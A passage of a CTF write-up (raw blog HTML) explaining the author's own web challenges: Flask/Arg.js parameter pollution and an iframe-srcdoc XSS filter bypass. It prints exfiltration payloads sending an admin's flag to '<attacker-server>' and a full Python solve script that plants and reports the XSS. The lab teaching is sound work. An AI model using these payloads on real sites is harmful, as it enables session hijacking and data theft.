class=\"token punctuation\">(</span><span class=\"token string\">'fancy.html'</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>The snipper which controls this is here:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">return</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token keyword\">and</span> k <span class=\"token operator\">!=</span> <span class=\"token string\">'q'</span> <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p>In short, if we have a key which is not <code class=\"language-text\">q</code>, the length of its value must not be greater than 1. If a value is greater than 1, the check will not be passed and we will instead receive the message informing us.</p>\n<p>However, our useage of Arg.js is not over yet! As the <code class=\"language-text\">__proto__[image]</code> parameter only needs to be accessed on the client side by Arg.js, what if we craft a url that flask believes is valid, which still allows for any length of value on the client side? As we are parsing the parameters both server-side and client-side, there may be some differences between the two parsers.</p>\n<p>In flask, if a duplicate parameter is encountered, the first appearance is used. In Arg.js, the last is used. With this in mind, <code class=\"language-text\">http://localhost:1337/fancy?q=idek{t&amp;style=1&amp;__proto__[image]=x&amp;__proto__[image]=http://&lt;attacker-server></code> will accomplish our goal. Flask thinks <code class=\"language-text\">__proto__[image]</code> is <code class=\"language-text\">x</code>, while Arg.js thinks it is the link to our server.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/8f3d34700ab6b88cac118e4151bcd364/33c9c/fancy-parameter-pollution.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.56962025316456%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA9ElEQVQoz52N3WqDQBCF9137Y1ZFbZpXawlEqzVJ01TtTaEQaNhKYqvEXU0iQgvOlHgRSNyrDh+H4XDODFH1vm4MdGPQUy1V71PtRqGmQq2eainUpNphOUDNiyvtyOW1rhm3pGkaAMB/DelaACA4L4tit92VZVkIITiXPiDSk9u6+s432SbnuUhzXlR7QGn5MzmHfWGcAUt4/JGuFg1bY5whS7pJgqPZGT/2pHL82hkvJ8P36V3tjGvH/7Wn3STBx/CUaPXsvkb3y7m9eBmtZx6bP7yFw/TJRy+C0zBBL+gQohu2GoAXoNs6klggLbedVo9Iy39KNcnBCz6j5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"parameter pollution achieved\"\n        title=\"parameter pollution achieved\"\n        src=\"/static/8f3d34700ab6b88cac118e4151bcd364/f058b/fancy-parameter-pollution.png\"\n        srcset=\"/static/8f3d34700ab6b88cac118e4151bcd364/c26ae/fancy-parameter-pollution.png 158w,\n/static/8f3d34700ab6b88cac118e4151bcd364/6bdcf/fancy-parameter-pollution.png 315w,\n/static/8f3d34700ab6b88cac118e4151bcd364/f058b/fancy-parameter-pollution.png 630w,\n/static/8f3d34700ab6b88cac118e4151bcd364/40601/fancy-parameter-pollution.png 945w,\n/static/8f3d34700ab6b88cac118e4151bcd364/33c9c/fancy-parameter-pollution.png 1133w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>Finally, we are able to craft an exploit which will leak the admin’s flag to our server.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> chars <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_'</span>\n<span class=\"token keyword\">let</span> flag <span class=\"token operator\">=</span> <span class=\"token string\">'idek{'</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">checkFlag</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">flag</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> url <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://localhost:1337/fancify?q=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>flag<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">&amp;style=1&amp;__proto__[image]=x&amp;__proto__[image]=http://&lt;attacker-server>/</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>flag<span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n    window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> c <span class=\"token keyword\">of</span> chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n  <span class=\"token function\">checkFlag</span><span class=\"token punctuation\">(</span>flag <span class=\"token operator\">+</span> c<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p>We can send the admin a link to our exploit and iterate the <code class=\"language-text\">flag</code> variable for each character we leak until we have the full flag.</p>\n<hr>\n<h1 id=\"generic-pastebin-challenge\" style=\"position:relative;\"><a href=\"#generic-pastebin-challenge\" aria-label=\"generic pastebin challenge permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>generic pastebin challenge</h1>\n<p>This was an xss challenge with a few solutions. My intended solution involved using an unclosed <code class=\"language-text\">srcdoc</code> attribute on an iframe to bypass the the filter.</p>\n<p>As implied by the title, the application is a simple pastebin, where we can store notes and access later with the link. User’s can only access their own notes, with the exception of the admin, who can view all notes. Reading the source, we can confirm that the flag is stored in the admin’s note, which is located at <code class=\"language-text\">/flag</code>.</p>\n<p>The title and content of our pastes are properly sanitized.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 236px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/130972da40e450dd06b46ab56ce79c8c/a7bcd/sanitized.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.89873417721519%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABF0lEQVQoz6WR3U6DQBCFef8HsG9gTDSV4EXLX2uAegGpiRCQH2u1FzXSWkqhsgs7u6ZiEFGvOheTyeR82TN7OHZEcc0EAE2nlAJA0+tNPdSCLswYQ6ggACUuAWh7v0u3BcJASFlWf7wMQBz7jr/sj8aaPBzoxk0QhGEQeK7r+wHfvzg9Ozd0XZKV6fQW4eonTCpFllRF4oUr0zI1TZ9MjF7vZDAURVHUtGtBENTR2LJMWVH3BerappSSitQuDudRijBmjOV5nqbpl4CQ+vIuTMjBTPG+j0LfdtzF4tnz7p/m82j26Dp29DDbZfmn7JvnOr9flThJNq9xnGfZcvmyiuP122a9ipNkixD+N6qjcm5XO9sm4d/wB0oVOdgow7X1AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"sanitized paste\"\n        title=\"sanitized paste\"\n        src=\"/static/130972da40e450dd06b46ab56ce79c8c/a7bcd/sanitized.png\"\n        srcset=\"/static/130972da40e450dd06b46ab56ce79c8c/c26ae/sanitized.png 158w,\n/static/130972da40e450dd06b46ab56ce79c8c/a7bcd/sanitized.png 236w\"\n        sizes=\"(max-width: 236px) 100vw, 236px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>In the jinja2 layout which is used for every page, we can see that the flashes are passed with the <code class=\"language-text\">|safe</code> filter, which will now sanitize any HTML passed to it.</p>\n<div class=\"gatsby-highlight\" data-language=\"jinja2\"><pre class=\"language-jinja2\"><code class=\"language-jinja2\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span>\n<span class=\"token jinja2 language-jinja2\"><span class=\"token delimiter punctuation\">{%</span> <span class=\"token tag keyword\">for</span> <span class=\"token variable\">message</span> <span class=\"token keyword\">in</span> <span class=\"token function\">get_flashed_messages</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token delimiter punctuation\">%}</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>flashes<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n                        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>label</span><span class=\"token punctuation\">></span></span><span class=\"token jinja2 language-jinja2\"><span class=\"token delimiter punctuation\">{{</span><span class=\"token variable\">message</span><span class=\"token operator\">|</span><span class=\"token filter function\">safe</span><span class=\"token delimiter punctuation\">}}</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>label</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>br</span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span>\n<span class=\"token jinja2 language-jinja2\"><span class=\"token delimiter punctuation\">{%</span> <span class=\"token tag keyword\">endfor</span> <span class=\"token delimiter punctuation\">%}</span></span>\n<span class=\"token jinja2 language-jinja2\"><span class=\"token delimiter punctuation\">{%</span> <span class=\"token tag keyword\">block</span> <span class=\"token variable\">body</span> <span class=\"token delimiter punctuation\">%}</span></span>\n<span class=\"token jinja2 language-jinja2\"><span class=\"token delimiter punctuation\">{%</span> <span class=\"token tag keyword\">endblock</span> <span class=\"token delimiter punctuation\">%}</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>footer</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>footer<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>content has-text-centered<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span>\n                Made with \"love\" by downgrade\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>footer</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>The code responsible for adding flashed messages to a page is here. In short, the <code class=\"language-text\">error</code> param is inserted into the page, but only if it passes the filter. The value of <code class=\"language-text\">error</code> must not contain any event handlers, and also cannot contain <code class=\"language-text\">script</code>, <code class=\"language-text\">svg</code>, <code class=\"language-text\">object</code>, <code class=\"language-text\">img</code>, <code class=\"language-text\">/</code>, <code class=\"language-text\">:</code>, or <code class=\"language-text\">></code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>before_request</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">add_flashes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'error'</span> <span class=\"token keyword\">in</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        msg <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token string\">'error'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token comment\"># no event handlers</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span>bad_string <span class=\"token keyword\">in</span> msg <span class=\"token keyword\">for</span> bad_string <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'on'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'='</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span>\n        <span class=\"token comment\"># none of this shit</span>\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span>bad_string <span class=\"token keyword\">in</span> msg <span class=\"token keyword\">for</span> bad_string <span class=\"token keyword\">in</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'script'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'svg'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'object'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'img'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">':'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'>'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">return</span>\n\n        flash<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></code></pre></div>\n<p>How can we achieve xss without any of these strings? Because we can specify an <code class=\"language-text\">error</code> message on the page of our notes, we can combine the our input sources for xss by utilizing an unclosed iframe <code class=\"language-text\">srcdoc</code>.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/677a6e04b5c4ee57d6ab3f269cbb1e34/47aef/iframe.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.60759493670886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgklEQVQY06XLywrCMBCF4byiFzCZlGrqQp8+i2TSCZj0CCkutIqFfhyYzfyqv9z7802TM9ZRdzV2oDZjB03uRE6T2x+73cEup1IzNvNNr4nI+EY+pvDbowHAzDnn5cP3eJqmuUkpAfDeM/PaOMYYQqgNgBCjiKyNa62lFPyjsMGm+Anx7rPfSAfsUwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"iframe with arbitrary HTML\"\n        title=\"iframe with arbitrary HTML\"\n        src=\"/static/677a6e04b5c4ee57d6ab3f269cbb1e34/f058b/iframe.png\"\n        srcset=\"/static/677a6e04b5c4ee57d6ab3f269cbb1e34/c26ae/iframe.png 158w,\n/static/677a6e04b5c4ee57d6ab3f269cbb1e34/6bdcf/iframe.png 315w,\n/static/677a6e04b5c4ee57d6ab3f269cbb1e34/f058b/iframe.png 630w,\n/static/677a6e04b5c4ee57d6ab3f269cbb1e34/40601/iframe.png 945w,\n/static/677a6e04b5c4ee57d6ab3f269cbb1e34/47aef/iframe.png 1063w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>This works because the <code class=\"language-text\">srcdoc</code> attribute does not close until another <code class=\"language-text\">\"</code> character is encountered on the page, which isn’t until <em>after</em> our paste content. Although our paste content is sanitized, it is still parsed as raw HTML when inside a <code class=\"language-text\">srcdoc</code> attribute. Therefore, in combining our input sources, we can create an iframe with any HTML to bypass the filter.</p>\n<p>We can create a paste with content <code class=\"language-text\">&lt;script>alert(document.domain)&lt;/script></code>. When the paste is accessed with <code class=\"language-text\">?error=iframe%20srcdoc=\"</code>, our javascript is executed.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/24c9507dfa6b55dc0c16dd62d403e782/6937a/alert.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.632911392405056%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABFElEQVQoz33OzU6DQBQFYF7IlSuNAhqTCtSVXVWgra26c1/UgOVHaGKbFugdhmEGfFIjk2gtpcmXyZ3kntwjDIaPw9GTOXgwzIlh8vePbox1c3Kn3/f7oyaB0ZIWjNKSNZSsKtkXo1VJq3reJQBgBBg2GOAfBPlisfoIoiSGeiFrEjKUt0lTFK9TBLhtYU8Y1V245vdQGGeE5EWOC5LTgnCMIzk9FMYZidebdyfw3OjtdWZN7RfL4ayp7dj+znFhu21BmO9F151bReldyF1J1DhZ6p6ddm7UXhIDzgiClrDnhpKoypImniuSqP6QtMuTqyPj+dgH+FxiXOwJ89ppAp4bBv7c96JfgRvO5ktvBWiTbdf+Bs1eQ+rxJmemAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"alert\"\n        title=\"alert\"\n        src=\"/static/24c9507dfa6b55dc0c16dd62d403e782/f058b/alert.png\"\n        srcset=\"/static/24c9507dfa6b55dc0c16dd62d403e782/c26ae/alert.png 158w,\n/static/24c9507dfa6b55dc0c16dd62d403e782/6bdcf/alert.png 315w,\n/static/24c9507dfa6b55dc0c16dd62d403e782/f058b/alert.png 630w,\n/static/24c9507dfa6b55dc0c16dd62d403e782/40601/alert.png 945w,\n/static/24c9507dfa6b55dc0c16dd62d403e782/6937a/alert.png 1094w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n  </a>\n    </span></p>\n<p>Then, we use our XSS to exfiltrate the admin’s note to our server.</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n\t<span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/pastes/flag\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">r</span><span class=\"token operator\">=></span>r<span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">t</span><span class=\"token operator\">=></span>document<span class=\"token punctuation\">.</span>location<span class=\"token operator\">=</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://&lt;attacker-server>/extract?data=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token punctuation\">{</span><span class=\"token function\">encodeURIComponent</span><span class=\"token punctuation\">(</span><span class=\"token function\">btoa</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>Here is a full solve script which was used as a healthcheck during the challenge:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token comment\">#!/usr/bin/env python3</span>\n\n<span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">import</span> string\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse\n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nusername <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\npassword <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl <span class=\"token operator\">=</span> listen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nvuln_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://localhost:1337\"</span>\nlocal_url <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"http://localhost:</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>l<span class=\"token punctuation\">.</span>lport<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span>\nsession <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>vuln_url<span class=\"token punctuation\">)</span>\n\nexploit_html <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">\"\"\"\\\n        &lt;script>\n            fetch(\"/pastes/flag\").then(r=>r.text().then(t=>document.location=`{}/extract?data=${{encodeURIComponent(btoa(t))}}`))\n        &lt;/script>\n        \"\"\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>local_url<span class=\"token punctuation\">)</span>\n\nexploit_post <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">\"title\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"exploit\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"content\"</span><span class=\"token punctuation\">:</span> exploit_html\n        <span class=\"token punctuation\">}</span>\n\ndangling_markup <span class=\"token operator\">=</span> <span class=\"token string\">'?error=&lt;iframe srcdoc=\"'</span>\n\n<span class=\"token comment\"># register &amp; login</span>\nuser_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"downgrade\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"password\"</span><span class=\"token punctuation\">:</span> password<span class=\"token punctuation\">}</span>\nsession<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>vuln_url <span class=\"token operator\">+</span> <span class=\"token string\">\"/register\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>user_data<span class=\"token punctuation\">)</span>\nsession<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>vuln_url <span class=\"token operator\">+</span> <span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>user_data<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># upload exploit</span>\nr <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>vuln_url <span class=\"token operator\">+</span> <span class=\"token string\">\"/create\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>exploit_post<span class=\"token punctuation\">,</span> allow_redirects<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span>\nexploit_location <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Location'</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token comment\"># report to admin</span>\nsession<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>vuln_url <span class=\"token operator\">+</span> <span class=\"token string\">\"/report\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"url\"</span><span class=\"token punctuation\">:</span> exploit_location <span class=\"token operator\">+</span> dangling_markup<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n_ <span class=\"token operator\">=</span> l<span class=\"token punctuation\">.</span>wait_for_connection<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ndata_raw <span class=\"token operator\">=</span> l<span class=\"token punctuation\">.</span>readuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'HTTP/1.1'</span><span class=\"token punctuation\">)</span>\ndata <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>urllib<span class=\"token punctuation\">.</span>parse<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>data_raw<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'data='</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token 